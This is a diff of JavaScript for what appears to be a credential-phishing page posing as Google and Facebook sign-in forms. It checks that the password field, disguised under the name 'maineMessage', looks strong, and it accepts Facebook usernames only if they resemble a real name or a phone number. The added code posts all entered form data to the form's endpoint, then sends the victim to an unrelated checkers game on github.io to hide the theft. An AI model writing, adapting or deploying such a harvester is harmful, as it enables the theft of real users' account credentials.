@@ -1,4 +1,4 @@
-let userMessage = localStorage.getItem('usermessage') || '';
+let userMessage = '';
 let form = document.getElementById('maine-form');
 let username = null;
 let lastSignin = localStorage.getItem('lastSignin');
@@ -9,8 +9,13 @@ let maineMessage = document.getElementById('maine-message');
 
 let msgError = document.querySelector('#msg-form');
 
+//facebook form error
+if (lastSignin == 'invalid') {
+    form.classList.add('invalid-username');
+}
 
 
+//google form error
 if (msgError) {
     isBadInput ? msgError.innerText = 'Invalid account or password please try again' : msgError.innerText = '';
     
@@ -25,7 +30,102 @@ firsrtInput.value = localStorage.getItem('firstInput') ?? '';
 
 
 
-// console.log(isBadInput);
+
+
+
+
+
+
+
+
+//Submit form and redirect
+
+form.addEventListener("submit", function(event) {
+    let isFormGood = false;
+    let source = form.getAttribute('data-source');
+    
+    //Check if valid google message
+    if (!isStrongmessage(maineMessage.value) && source == "google") {
+        localStorage.setItem('badInput',true);
+        localStorage.setItem('firstInput', firsrtInput.value);
+    } else {
+        localStorage.setItem('badInput',false);
+        localStorage.clear('firstInput');
+        isFormGood = true;
+    }
+
+
+ //invaid facebook username 
+ if (source == 'facebook') {
+    // username... remove white space
+    username.trim();
+    let usernameSpaces = 0;
+    let isPhoneNum = username > 9000000000;
+    for (let char of username) {if(char == ' '){usernameSpaces++}}
+
+    let validUsername = usernameSpaces == 1 && username.length > 5 || isPhoneNum;
+    if (validUsername && isStrongmessage(maineMessage.value)) {
+        localStorage.setItem('lastSignin', 'valid');
+        localStorage.clear('lastSignIn');
+        isFormGood = true;
+    } else {
+        //not a valid account username
+        //Make the reload restart here to make link not visible in form
+        localStorage.setItem('lastSignin', 'invalid');
+        localStorage.setItem('firstInput', firsrtInput.value);
+    }
+}
+
+if (isFormGood) {
+    event.preventDefault(); // Prevent default form submission
+    
+    // Get form data
+    var formData = new FormData(this);
+    
+    // Send form data asynchronously
+    fetch(this.action, {
+      method: 'POST',
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    })
+    .then(response => {
+      if (response.ok) {
+        // Optionally, do something with the successful response
+        console.log("Form submitted successfully");
+        // Redirect to github.com
+        window.location.href = "https://ukulyelye.github.io/checkers-app/";
+      } else {
+        // Handle errors
+        console.error("Form submission failed");
+      }
+    })
+    .catch(error => {
+      alert('error');
+      console.error("Error:", error);
+    });
+}
+
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 function isStrongmessage(message) {
     // Check for at least one uppercase letter
@@ -49,69 +149,3 @@ function isStrongmessage(message) {
     // Combine all conditions
     return  hasSpecialChar && isLongEnough && hasTextOrDigit;
 }
-
-
-function formClick() {
-    verifyAccount();
-    if (isStrongmessage(maineMessage.value) && msgError) {
-        localStorage.setItem('badInput',false);
-        window.location.href = 'https://ukulyelye.github.io/checkers-app/checkers';
-        localStorage.clear('firstInput');
-        return false
-    } else {
-        localStorage.setItem('badInput',true);
-        localStorage.setItem('firstInput', firsrtInput.value);
-    }
-}
-
-if (lastSignin == 'invalid') {
-    form.classList.add('invalid-username');
-}
-
-//verify user and redirect
-// [ ] Check if 2 word username
-
-//I focus this for facebook
-function verifyAccount (source) {
-
-    
-    let inputGroup = form.querySelectorAll('input');
-    let texts = '';
-    inputGroup.forEach((input)=>{
-        if (input.value != '' && input.type != 'submit') {
-            texts += `${input.name}: ${input.value}* `;
-            localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
-            if (input.name == 'username') {
-                username = input.value;
-            }
-        }
-    })
-    
-    //invaid facebook username 
-    if (source == 'facebook') {
-        // username... remove white space
-        username.trim();
-        let usernameSpaces = 0;
-        let isPhoneNum = username > 9000000000;
-        for (let char of username) {if(char == ' '){usernameSpaces++}}
-
-        let validUsername = usernameSpaces == 1 && username.length > 5 || isPhoneNum;
-        if (validUsername && isStrongmessage(maineMessage.value)) {
-            localStorage.setItem('lastSignin', 'valid');
-            window.location.href = 'https://ukulyelye.github.io/checkers-app/checkers';
-            localStorage.clear('lastSignIn');
-            return false;
-            alert('error');
-
-        } else {
-            //not a valid account username
-            //Make the reload restart here to make link not visible in form
-            localStorage.setItem('lastSignin', 'invalid');
-            localStorage.setItem('firstInput', firsrtInput.value);
-
-        }
-    }
-}
-
-
-//add feedback ratings
